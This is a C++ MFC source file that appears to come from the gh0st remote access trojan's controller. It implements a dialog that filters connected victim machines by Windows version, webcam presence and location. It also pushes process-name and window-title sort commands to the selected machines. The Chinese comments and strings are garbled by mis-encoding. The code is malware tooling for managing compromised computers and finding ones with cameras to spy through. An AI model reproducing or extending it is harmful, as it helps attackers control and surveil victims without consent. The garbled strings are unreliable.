// MoreChoose.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "MoreChoose.h"

#include "PcView.h"
#include "gh0stView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CPcView* g_pConnectView;
extern CGh0stView* g_pTabView;
/////////////////////////////////////////////////////////////////////////////
// CMoreChoose

IMPLEMENT_DYNCREATE(CMoreChoose, CFormView)

CMoreChoose::CMoreChoose()
	: CFormView(CMoreChoose::IDD)
{
	//{{AFX_DATA_INIT(CMoreChoose)
	m_Win2000 = FALSE;
	m_Win2003 = FALSE;
	m_Win2008 = FALSE;
	m_WinNT = FALSE;
	m_WinVista = FALSE;
	m_Win7 = FALSE;
	m_WinXP = FALSE;
	m_check_num = FALSE;
	m_check_all = FALSE;
	m_edit_num = 0;
	//}}AFX_DATA_INIT
}

CMoreChoose::~CMoreChoose()
{
}

void CMoreChoose::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMoreChoose)
	DDX_Check(pDX, IDC_CHECK_2000, m_Win2000);
	DDX_Check(pDX, IDC_CHECK_2003, m_Win2003);
	DDX_Check(pDX, IDC_CHECK_2008, m_Win2008);
	DDX_Check(pDX, IDC_CHECK_NT, m_WinNT);
	DDX_Check(pDX, IDC_CHECK_VISTA, m_WinVista);
	DDX_Check(pDX, IDC_CHECK_WIN7, m_Win7);
	DDX_Check(pDX, IDC_CHECK_XP, m_WinXP);
	DDX_Check(pDX, IDC_CHECK_NUM, m_check_num);
	DDX_Check(pDX, IDC_CHECK_ALL, m_check_all);
	DDX_Text(pDX, IDC_EDIT_NUM, m_edit_num);
	DDV_MinMaxInt(pDX, m_edit_num, 0, 1000000);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CMoreChoose, CFormView)
	//{{AFX_MSG_MAP(CMoreChoose)
	ON_BN_CLICKED(IDC_CHECK_NUM, OnCheckNum)
	ON_BN_CLICKED(IDC_FIND, OnFind)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMoreChoose diagnostics

#ifdef _DEBUG
void CMoreChoose::AssertValid() const
{
	CFormView::AssertValid();
}

void CMoreChoose::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMoreChoose message handlers

void CMoreChoose::OnCheckNum() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	int a = 0;
	CPcView* pView = NULL;
	if ( m_check_all == TRUE )
	{
		int count = g_pTabView->m_wndTabControl.GetItemCount();
		for ( int i = 0; i < count; i++ )
		{
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
			a += pView->m_pListCtrl->GetItemCount();
		}
		if ( a == 0 )
		{	
			CheckDlgButton(IDC_CHECK_NUM, BST_UNCHECKED);
			AfxMessageBox( "û����������- -����" );
			return;
		}
	}
	else
	{
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
		if (pView->m_pListCtrl->GetItemCount() == 0)
		{
			AfxMessageBox( "��ǰ����û����������- -����" );
			CheckDlgButton(IDC_CHECK_NUM, BST_UNCHECKED);
			return;
		}
	}
	GetDlgItem(IDC_EDIT_NUM)->EnableWindow(m_check_num);
}

void CMoreChoose::OnFind() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	CString strNewGroup, strOS, strCam, strAddress, process, window;
	CPcView* pView = NULL;
	if ( m_check_all == TRUE )
	{	
		/*
		((CComboBox*)GetDlgItem(IDC_INSTALL_PATH))->GetWindowText(strNewGroup);
		if ( strNewGroup.GetLength() == NULL )
		{
			::MessageBox(0,"����дɸѡ���ƶ��ķ������ƣ�","��ʾ", MB_ICONINFORMATION);
			return;
		}
		*/
		CPcView* pView = NULL;
		int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
		int newnum = 0 ;
		for (int k = 0 ; k < nTabs; k++ )
		{
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(k)->GetHandle()));			
			int num = pView->m_pListCtrl->GetItemCount();
			newnum = newnum + num ;//��ȡ�ܹ�����
		}
		if (newnum == 0)
		{
			::AfxMessageBox("û����������- -����");
			return;
		}

		for (int n = 0; n < nTabs; n++ )
		{
			pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
			int nCnt = pView->m_pListCtrl->GetItemCount();
			for ( int i = 0; i < nCnt; i++)
			{	
				pView->m_pListCtrl->SetCheck( i, FALSE );
	//---------------------------ϵͳɸѡ---------------------------------------------------------
				strOS = pView->m_pListCtrl->GetItemText( i, 3 );
				strOS.MakeUpper();
				if ( m_WinNT == TRUE )
				{
					if ( strOS.Find("NT") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE );
					}
				}
				if ( m_WinXP == TRUE )
				{	
					if ( strOS.Find("XP") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE );
					}
				}
				if ( m_WinVista == TRUE )
				{
					if ( strOS.Find("Vista") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE );
					}
				}
				if ( m_Win2000 == TRUE )
				{
					if ( strOS.Find("2000") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE ); 
					}
				}
				if ( m_Win2003 == TRUE )
				{
					if ( strOS.Find("2003") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE ); 
					}
				}
				if ( m_Win2008 == TRUE )
				{
					if ( strOS.Find("2008") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE ); 
					}
				}
				if ( m_Win7 == TRUE )
				{
					if ( strOS.Find("Win7") != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE ); 
					}
				}
				//�ж�ϵͳ��ť�Ƿ�ѡ�У�ѡ����ɸѡǰ����ɸѡ�������������ȫ��ɸѡ						
				if (m_WinNT == FALSE & m_WinXP == FALSE & m_WinVista == FALSE & m_Win7 == FALSE
					& m_Win2008 == FALSE & m_Win2003 == FALSE & m_Win2000 == FALSE)
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
	//---------------------------��Ƶɸѡ---------------------------------------------------------
				((CComboBox*)GetDlgItem(IDC_COMBO_CAM))->GetWindowText(strCam);
				if ( strCam.Find("����") == -1 )
				{
					if ( strCam.Find( "��" ) != -1 )
					{	
						strCam = pView->m_pListCtrl->GetItemText( i, 9 );
						if ( strCam.Find( "��" ) != -1 )
						{
							pView->m_pListCtrl->SetCheck( i, TRUE );
						}
						else
						{
							pView->m_pListCtrl->SetCheck( i, FALSE );
						}
					}
					else
					{	
						strCam = pView->m_pListCtrl->GetItemText( i, 9 );
						if ( strCam.Find( "��" ) != -1 )
						{
							pView->m_pListCtrl->SetCheck( i, TRUE );
						}
						else
						{
							pView->m_pListCtrl->SetCheck( i, FALSE );
						}
					}
				} 
//---------------------------����ɸѡ---------------------------------------------------------			
				if (pView->m_pListCtrl->GetCheck( i )== TRUE)
				{
					((CComboBox*)GetDlgItem(IDC_COMBO_ADDRESS))->GetWindowText(strAddress);
					if ( strAddress.GetLength() != NULL )
					{	
						if (strstr( pView->m_pListCtrl->GetItemText( i, 11 ), strAddress ) != NULL )
						{
							pView->m_pListCtrl->SetCheck( i, TRUE );
						}
						else
						{
							pView->m_pListCtrl->SetCheck( i, FALSE );
						}
					}
				}
	//---------------------------��Ƶɸѡ---------------------------------------------------------
				((CComboBox*)GetDlgItem(IDC_COMBO_CAM))->GetWindowText(strCam);
				if (pView->m_pListCtrl->GetCheck( i )== TRUE)
				{
					if ( strCam.Find("����") == -1 )
					{
						if ( strCam.Find( "��" ) != -1 )
						{	
							strCam = pView->m_pListCtrl->GetItemText( i, 9 );
							if ( strCam.Find( "��" ) != -1 )
							{
								pView->m_pListCtrl->SetCheck( i, TRUE );
							}
							else
							{
								pView->m_pListCtrl->SetCheck( i, FALSE );
							}
						}
						else
						{	
							strCam = pView->m_pListCtrl->GetItemText( i, 9 );
							if ( strCam.Find( "��" ) != -1 )
							{
								pView->m_pListCtrl->SetCheck( i, TRUE );
							}
							else
							{
								pView->m_pListCtrl->SetCheck( i, FALSE );
							}
						}
					}
				}
//---------------------------����ɸѡ---------------------------------------------------------			
				if (pView->m_pListCtrl->GetCheck( i )== TRUE)
				{
					((CComboBox*)GetDlgItem(IDC_COMBO_ADDRESS))->GetWindowText(strAddress);
					if ( strAddress.GetLength() != NULL )
					{	
						if (strstr( pView->m_pListCtrl->GetItemText( i, 11 ), strAddress ) != NULL )
						{
							pView->m_pListCtrl->SetCheck( i, TRUE );
						}
						else
						{
							pView->m_pListCtrl->SetCheck( i, FALSE );
						}
					}
				}
			}//for								
		}//tab
	//--------------------------����ɸѡ����-------------------------------------------------
		((CComboBox*)GetDlgItem(IDC_COMBO_PROSS))->GetWindowText(process);
		if (process.GetLength() != NULL)
		{
			if (m_WinNT == FALSE & m_WinXP == FALSE & m_WinVista == FALSE & m_Win7 == FALSE& m_Win2008 == FALSE 
				& m_Win2003 == FALSE & m_Win2000 == FALSE & strAddress.GetLength() == NULL & strCam.Find("����") != -1)
			{
				CPcView* pView = NULL;
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
				int nCnt = pView->m_pListCtrl->GetItemCount();
				for ( int i = 0; i < nCnt; i++)
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			int		nPacketLength = process.GetLength() + 2;
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_SORT_PROCESS;
			memcpy(lpPacket + 1, process.GetBuffer(0), nPacketLength - 1);
			g_pConnectView->SendSelectCommand(lpPacket, nPacketLength);
			delete[] lpPacket;
		}
	//---------------------------����ɸѡ����-------------------------------------------------
		((CComboBox*)GetDlgItem(IDC_COMBO_WINDOW))->GetWindowText(window);
		if ( window.GetLength() != NULL)
		{
			if (m_WinNT == FALSE & m_WinXP == FALSE & m_WinVista == FALSE & m_Win7 == FALSE& m_Win2008 == FALSE 
				& m_Win2003 == FALSE & m_Win2000 == FALSE & strAddress.GetLength() == NULL & strCam.Find("����") != -1
				& process.GetLength() == NULL)
			{
				CPcView* pView = NULL;
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
				int nCnt = pView->m_pListCtrl->GetItemCount();
				for ( int i = 0; i < nCnt; i++)
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			int		nPacketLength = window.GetLength() + 2;
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_SORT_WINDOW;
			memcpy(lpPacket + 1, window.GetBuffer(0), nPacketLength - 1);
			g_pConnectView->SendSelectCommand(lpPacket, nPacketLength);
			delete[] lpPacket;			
		} 	
	}
	else
	{	
		CPcView* pView = NULL;		
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
		int nItems = pView->m_pListCtrl->GetItemCount();
		if ( nItems == 0)
		{
			AfxMessageBox( "��ǰ����û����������- -����" );
			return;
		}
		for ( int i = 0; i < nItems; i++)
		{	
			pView->m_pListCtrl->SetCheck( i, FALSE );
//---------------------------ϵͳɸѡ---------------------------------------------------------
			strOS = pView->m_pListCtrl->GetItemText( i, 3 );
			strOS.MakeUpper();
			if ( m_WinNT == TRUE )
			{
				if ( strOS.Find("NT") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			if ( m_WinXP == TRUE )
			{	
				if ( strOS.Find("XP") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			if ( m_WinVista == TRUE )
			{
				if ( strOS.Find("Vista") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			if ( m_Win2000 == TRUE )
			{
				if ( strOS.Find("2000") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE ); 
				}
			}
			if ( m_Win2003 == TRUE )
			{
				if ( strOS.Find("2003") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE ); 
				}
			}
			if ( m_Win2008 == TRUE )
			{
				if ( strOS.Find("2008") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE ); 
				}
			}
			if ( m_Win7 == TRUE )
			{
				if ( strOS.Find("Win7") != -1 )
				{
					pView->m_pListCtrl->SetCheck( i, TRUE ); 
				}
			}
			//�ж�ϵͳ��ť�Ƿ�ѡ�У�ûѡ����ȫ����ѡһ��						
			if (m_WinNT == FALSE & m_WinXP == FALSE & m_WinVista == FALSE & m_Win7 == FALSE
				& m_Win2008 == FALSE & m_Win2003 == FALSE & m_Win2000 == FALSE)
			{
				pView->m_pListCtrl->SetCheck( i, TRUE );
			}
//---------------------------��Ƶɸѡ---------------------------------------------------------
			((CComboBox*)GetDlgItem(IDC_COMBO_CAM))->GetWindowText(strCam);
			if ( strCam.Find("����") == -1 )
			{
				if ( strCam.Find( "��" ) != -1 )
				{	
					strCam = pView->m_pListCtrl->GetItemText( i, 9 );
					if ( strCam.Find( "��" ) != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE );
					}
					else
					{
						pView->m_pListCtrl->SetCheck( i, FALSE );
					}
				}
				else
				{	
					strCam = pView->m_pListCtrl->GetItemText( i, 9 );
					if ( strCam.Find( "��" ) != -1 )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE );
					}
					else
					{
						pView->m_pListCtrl->SetCheck( i, FALSE );
					}
				}
			} 
//---------------------------����ɸѡ---------------------------------------------------------			
			if (pView->m_pListCtrl->GetCheck( i )== TRUE)
			{
				((CComboBox*)GetDlgItem(IDC_COMBO_ADDRESS))->GetWindowText(strAddress);
				if ( strAddress.GetLength() != NULL )
				{	
					if (strstr( pView->m_pListCtrl->GetItemText( i, 11 ), strAddress ) != NULL )
					{
						pView->m_pListCtrl->SetCheck( i, TRUE );
					}
					else
					{
						pView->m_pListCtrl->SetCheck( i, FALSE );
					}
				}
			}
		}
	//---------------------------����ɸѡ����-------------------------------------------------
		((CComboBox*)GetDlgItem(IDC_COMBO_PROSS))->GetWindowText(process);
		if (process.GetLength() != NULL)
		{
			if (m_WinNT == FALSE & m_WinXP == FALSE & m_WinVista == FALSE & m_Win7 == FALSE& m_Win2008 == FALSE 
				& m_Win2003 == FALSE & m_Win2000 == FALSE & strAddress.GetLength() == NULL & strCam.Find("����") != -1)
			{
				CPcView* pView = NULL;
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
				int nCnt = pView->m_pListCtrl->GetItemCount();
				for ( int i = 0; i < nCnt; i++)
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			int		nPacketLength = process.GetLength() + 2;
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_SORT_PROCESS;
			memcpy(lpPacket + 1, process.GetBuffer(0), nPacketLength - 1);
			g_pConnectView->SendSelectCommand(lpPacket, nPacketLength);
			delete[] lpPacket;			
		}
	//---------------------------����ɸѡ����-------------------------------------------------
		((CComboBox*)GetDlgItem(IDC_COMBO_WINDOW))->GetWindowText(window);
		if ( window.GetLength() != NULL)
		{
			if (m_WinNT == FALSE & m_WinXP == FALSE & m_WinVista == FALSE & m_Win7 == FALSE& m_Win2008 == FALSE 
				& m_Win2003 == FALSE & m_Win2000 == FALSE & strAddress.GetLength() == NULL & strCam.Find("����") != -1
				& process.GetLength() == NULL)
			{
				CPcView* pView = NULL;
				pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
				int nCnt = pView->m_pListCtrl->GetItemCount();
				for ( int i = 0; i < nCnt; i++)
				{
					pView->m_pListCtrl->SetCheck( i, TRUE );
				}
			}
			int		nPacketLength = window.GetLength() + 2;
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_SORT_WINDOW;
			memcpy(lpPacket + 1, window.GetBuffer(0), nPacketLength - 1);
			g_pConnectView->SendSelectCommand(lpPacket, nPacketLength);
			delete[] lpPacket;			
		} 		
	}
}

